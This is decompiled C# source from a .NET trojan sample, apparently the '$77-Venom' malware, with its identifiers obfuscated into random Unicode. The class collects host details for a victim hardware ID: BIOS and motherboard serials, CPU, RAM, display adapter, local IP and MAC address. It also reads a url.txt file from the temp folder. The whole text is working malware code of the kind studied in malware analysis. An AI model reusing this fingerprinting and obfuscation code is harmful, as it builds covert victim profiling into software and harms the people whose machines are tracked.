// Decompiled with JetBrains decompiler
// Type: 톼︟ϓ䍁얙뉿椺ꝳ⸝↫碓ጯ�璅囐痱뻌ᕤ琝
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;

public static class 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝
{
  public static string HardwareId { get; private set; }

  static 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝() => 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.HardwareId = ۮ䁴ꁲ\uF49B퐏镆\u21B8暺\uE255갣\u074B畺뛘ⰸ冖뭁\uEDC6矹\uFF00\uFFFD.㥯\uEAE8賬\uFFFD\u083C㷜ฯ搘頇녶㘞晲ᐉ匂\uFFFD䣽ỉ嵏\u0B45טּ(톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.\uFFFD鞻\uE7D5䎿\u0E8F\uE4A8ᮌ惑늽巁\uE0B6冕ꞗ闾櫆㵹驗諗\uFDCC\uE97B() + 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.듟쌖麞뢓ꮋ膶ꪥ쿖鲐쟳擦\uF6D9踷ᡝࢫ偧믷期ゔꗡ() + 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.\uA625\uF748\uE46Fἠ澡\u17D9뢬غ详㡵蘮컿驚몘꺤\uFFFDﳸ\uF89A㪌鲛());

  public static string \uA625\uF748\uE46Fἠ澡\u17D9뢬غ详㡵蘮컿驚몘꺤\uFFFDﳸ\uF89A㪌鲛()
  {
    try
    {
      string empty = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            empty = enumerator.Current["Manufacturer"].ToString();
        }
      }
      return !string.IsNullOrEmpty(empty) ? empty : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string 듟쌖麞뢓ꮋ膶ꪥ쿖鲐쟳擦\uF6D9踷ᡝࢫ偧믷期ゔꗡ()
  {
    try
    {
      string str = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
          {
            ManagementObject current = (ManagementObject) enumerator.Current;
            str = current["Manufacturer"].ToString() + current["SerialNumber"].ToString();
          }
        }
      }
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static string \uFFFD鞻\uE7D5䎿\u0E8F\uE4A8ᮌ惑늽巁\uE0B6冕ꞗ闾櫆㵹驗諗\uFDCC\uE97B()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Name"].ToString() + "; ";
      }
      string str = ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.멳㧤돘\uF642\uFFFD\uE256噏䴩춬\u2428锫\u3332檲㒅霡暩눴但뒹豧(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
    }
    return "Unknown";
  }

  public static int 멶\u1B79\uF46F쁘\uE62B㞼챯蝐拉뵂\uE3D5\uEFBF㑬浥\u2EA4颺\u2B0E㓻긲뉫()
  {
    try
    {
      int num = 0;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
      {
        using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
        {
          if (enumerator.MoveNext())
            num = (int) (Convert.ToDouble(enumerator.Current["TotalPhysicalMemory"]) / 1048576.0);
        }
      }
      return num;
    }
    catch
    {
      return -1;
    }
  }

  public static string 扑ೱ掆饖ꛝế\uFFFD凿ڭ읫鵬\uFFFDⶎ谋\u0ECF收\uE647卻꽽벾()
  {
    try
    {
      string input = string.Empty;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DisplayConfiguration"))
      {
        foreach (ManagementObject managementObject in managementObjectSearcher.Get())
          input = input + managementObject["Description"].ToString() + "; ";
      }
      string str = ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.멳㧤돘\uF642\uFFFD\uE256噏䴩춬\u2428锫\u3332檲㒅霡暩눴但뒹豧(input);
      return !string.IsNullOrEmpty(str) ? str : "N/A";
    }
    catch
    {
      return "Unknown";
    }
  }

  public static string \u2A34\u0876鐨ꤸ랒ꕕ\uF2E4幤\u19DD\u2AE3印蕇黝\u00A4\uE838줨뻹鲓㵋᷈()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.GetIPProperties().GatewayAddresses.FirstOrDefault<GatewayIPAddressInformation>() != null && (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up))
      {
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            return unicastAddress.Address.ToString();
        }
      }
    }
    return "-";
  }

  public static string 彘䉵얋\uEEDBꣁ\uFFFD瀿ꡟ㯭\uEF20鹁\uA4AD\uFF65\uFFFD솇שּׁ\uF51F먃猚쾋()
  {
    foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
    {
      if (networkInterface.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || networkInterface.NetworkInterfaceType == NetworkInterfaceType.Ethernet && networkInterface.OperationalStatus == OperationalStatus.Up)
      {
        bool flag = false;
        foreach (UnicastIPAddressInformation unicastAddress in networkInterface.GetIPProperties().UnicastAddresses)
        {
          if (unicastAddress.Address.AddressFamily == AddressFamily.InterNetwork && unicastAddress.AddressPreferredLifetime != (long) uint.MaxValue)
            flag = unicastAddress.Address.ToString() == 톼\uFE1Fϓ䍁얙뉿椺ꝳ\u2E1D\u21AB碓ጯ\uFFFD璅囐痱뻌ᕤ\uE262琝.\u2A34\u0876鐨ꤸ랒ꕕ\uF2E4幤\u19DD\u2AE3印蕇黝\u00A4\uE838줨뻹鲓㵋᷈();
        }
        if (flag)
          return ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.ጭ\uED29脑릢恖\uEF64騺\uF3CB먧ﷹ焮\uE9A1\uEE6B莏ᗐ끪뵿\u24A8刁秡(networkInterface.GetPhysicalAddress().ToString());
      }
    }
    return "-";
  }

  public static string 䕖참調邬杷ꉆ뮱\u0E80齏\u1AD3瓌ₔᖥ㔛촁買㱀䲟Ⲿ鯚()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }

  public static string 䢊ᔋ\u25CD\u2441廌\u07F8ᘣ\u2255骩䁈驣滥\uAADFꭆ㗍嗖ᝓᘔ畤얀()
  {
    string str1 = File.ReadAllText(Path.Combine(Path.GetTempPath(), "url.txt").ToString());
    try
    {
      string empty = string.Empty;
      string str2 = str1;
      return !string.IsNullOrEmpty(str2) ? str2 : "N/A";
    }
    catch
    {
    }
    return "-";
  }
}
